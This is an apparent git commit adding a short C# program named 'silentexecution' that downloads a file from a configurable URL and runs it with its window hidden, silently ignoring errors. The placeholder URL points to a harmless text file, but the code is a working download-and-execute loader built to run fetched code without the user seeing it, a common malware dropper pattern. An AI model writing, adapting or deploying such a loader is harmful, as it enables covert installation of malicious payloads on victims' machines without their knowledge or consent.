66efaae51bb41c09e2149c20a5a0cdb73c7e2342
ToxidWorm <79449659+toxidworm@users.noreply.github.com>
2022-09-27 22:50:23 +0300

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,31 @@
+﻿using System.Net;
+using System.Diagnostics;
+
+namespace silentexecution
+{
+    class Program
+    {
+        //Url to download (must be raw or it will download a html page lol)
+        public static string URL = "https://google.com/robots.txt";
+        //Output filename
+        public static string Output = "robots.txt";
+        
+        static void Main(string[] args)
+        {
+            //ProcessStartInfo, used here to hide the window
+            ProcessStartInfo PSI = new ProcessStartInfo(Output);
+            PSI.WindowStyle = ProcessWindowStyle.Hidden;
+            PSI.CreateNoWindow = true;
+            try
+            {
+                //Creating webclient object
+                WebClient wc = new WebClient();
+                //Downloading the file
+                wc.DownloadFile(URL, Output);
+                //Starting the file
+                Process.Start(PSI);
+            }
+            catch { }
+        }
+    }
+}
